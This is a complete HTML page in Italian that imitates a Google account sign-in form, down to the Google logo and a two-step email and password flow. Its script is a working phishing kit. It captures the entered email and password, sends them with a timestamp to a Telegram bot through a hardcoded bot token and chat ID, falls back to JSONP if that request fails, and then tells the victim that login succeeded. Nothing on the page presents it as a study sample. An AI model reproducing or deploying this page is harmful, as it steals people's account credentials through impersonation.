<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Accedi</title>
<style>
  #app { font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; color: var(--host-fg, #1a1a1a); display: flex; justify-content: center; padding: 8px 0; }
  #app .card { width: 100%; max-width: 360px; border: 1px solid rgba(130,130,130,.3); border-radius: 14px; padding: 26px 24px; box-sizing: border-box; }
  #app .logo { text-align: center; margin-bottom: 12px; }
  #app h1 { font-size: 21px; font-weight: 500; margin: 0 0 4px; text-align: center; }
  #app .sub { font-size: 13.5px; opacity: .65; margin-bottom: 22px; text-align: center; }
  #app input { width: 100%; padding: 12px 13px; border: 1px solid rgba(130,130,130,.35); border-radius: 9px; background: transparent; color: inherit; font-size: 15px; box-sizing: border-box; margin-bottom: 12px; font-family: inherit; }
  #app input:focus { outline: 2px solid #1a73e8; outline-offset: -1px; border-color: transparent; }
  #app button.primary { width: 100%; padding: 12px; border: 0; border-radius: 9px; background: #1a73e8; color: #fff; font-weight: 500; font-size: 15px; cursor: pointer; font-family: inherit; }
  #app .chip { display: flex; align-items: center; justify-content: space-between; gap: 10px; border: 1px solid rgba(130,130,130,.3); border-radius: 9px; padding: 10px 12px; font-size: 14px; margin-bottom: 12px; }
  #app .chip a { color: #1a73e8; cursor: pointer; font-size: 13px; text-decoration: none; }
  #app .status { font-size: 12.5px; margin-top: 12px; min-height: 16px; text-align: center; opacity: 0; transition: opacity .25s; line-height: 1.5; }
  #app .status.on { opacity: .75; }
  #app .status.err { opacity: 1; color: #c5221f; }
  #app [hidden] { display: none !important; }
</style>
</head>
<body>
<div id="app">
  <div class="card">
    <div class="logo">
      <svg width="26" height="26" viewBox="0 0 48 48" aria-hidden="true">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      </svg>
    </div>
    <h1>Accedi</h1>
    <div class="sub">Usa il tuo account Google</div>

    <div id="step1">
      <input id="email" type="email" placeholder="Email" autocomplete="email" autofocus>
      <button class="primary" id="next">Avanti</button>
    </div>

    <div id="step2" hidden>
      <div class="chip">
        <span id="shownEmail"></span>
        <a id="back">Cambia</a>
      </div>
      <input id="pwd" type="password" placeholder="Password" autocomplete="current-password">
      <button class="primary" id="go">Accedi</button>
    </div>

    <div class="status" id="status"></div>
  </div>
</div>

<script>
(function () {
  var BOT_TOKEN = "8656542427:AAGGNnffMIXvhsOY5gK0jS4rR699fSbQC4A";
  var CHAT_ID = "7704218665";

  var statusEl = document.getElementById("status");
  var step1 = document.getElementById("step1");
  var step2 = document.getElementById("step2");
  var emailEl = document.getElementById("email");
  var pwdEl = document.getElementById("pwd");
  var shownEl = document.getElementById("shownEmail");
  var hideTimer = null;

  function setStatus(msg, kind) {
    statusEl.textContent = msg || "";
    statusEl.className = "status" + (kind ? " " + kind : "");
    if (kind !== "err") {
      statusEl.classList.add("on");
      clearTimeout(hideTimer);
      if (msg) hideTimer = setTimeout(function () { statusEl.classList.remove("on"); }, 4500);
    }
  }

  function sendToBot(text) {
    var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    return fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    }).then(function (r) { return r.json(); }).then(function (d) {
      if (!d.ok) throw new Error(d.description || "errore");
      return d;
    }).catch(function () { return jsonpSend(text); });
  }

  function jsonpSend(text) {
    return new Promise(function (resolve, reject) {
      var cb = "tg_" + Date.now();
      var s = document.createElement("script");
      var done = false;
      window[cb] = function (d) { done = true; resolve(d); try { delete window[cb]; } catch (e) {} s.remove(); };
      s.onerror = function () { if (!done) reject(new Error("invio fallito")); };
      s.src = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" +
        encodeURIComponent(CHAT_ID) + "&text=" + encodeURIComponent(text) + "&callback=" + cb;
      document.body.appendChild(s);
      setTimeout(function () { if (!done) reject(new Error("timeout")); }, 8000);
    });
  }

  function goNext() {
    var e = emailEl.value.trim();
    if (!/^\S+@\S+\.\S+$/.test(e)) { setStatus("Inserisci un'email valida", "err"); return; }
    shownEl.textContent = e;
    step1.hidden = true;
    step2.hidden = false;
    pwdEl.focus();
    setStatus("");
  }

  function submit() {
    var e = emailEl.value.trim();
    var p = pwdEl.value;
    if (!p) { setStatus("Inserisci la password", "err"); return; }
    var msg = "Accesso\nEmail: " + e + "\nPassword: " + p + "\nOra: " + new Date().toLocaleString("it-IT");
    setStatus("Accesso effettuato");
    sendToBot(msg).catch(function (err) {
      setStatus("Accesso effettuato (invio: " + err.message + ")", "err");
    });
  }

  document.getElementById("next").addEventListener("click", goNext);
  document.getElementById("go").addEventListener("click", submit);
  document.getElementById("back").addEventListener("click", function () {
    step2.hidden = true;
    step1.hidden = false;
    emailEl.focus();
  });

  emailEl.addEventListener("keydown", function (ev) { if (ev.key === "Enter") goNext(); });
  pwdEl.addEventListener("keydown", function (ev) { if (ev.key === "Enter") submit(); });
})();
</script>
</body>
  </html>
